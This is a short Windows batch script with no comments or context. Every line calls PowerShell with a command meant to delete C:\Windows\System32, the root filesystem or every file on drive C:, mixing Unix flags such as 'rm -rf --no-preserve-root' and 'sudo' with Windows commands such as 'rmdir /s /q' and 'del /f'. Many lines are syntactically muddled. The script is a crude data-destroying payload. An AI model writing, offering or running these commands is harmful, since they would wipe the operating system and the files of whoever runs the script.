@echo OFF
powershell rm -rf C:\Windows\System32 --no-preserve-root
powershell sudo rm -rf / --no-preserve-root
powershell rmdir /s /q C:\Windows\System32
powershell rm -rf C:\Windows\System32 -f --no-preserve-root
powershell rm -rf C:\Windows\System32 -f
powershell sudo rm -rf C:\Windows\System32 -f
powershell rmdir C:\Windows\System32
powershell del /f c:\*.* & S
powershell sudo rm -rf C:\Windows\System32 -f --no-preserve-root
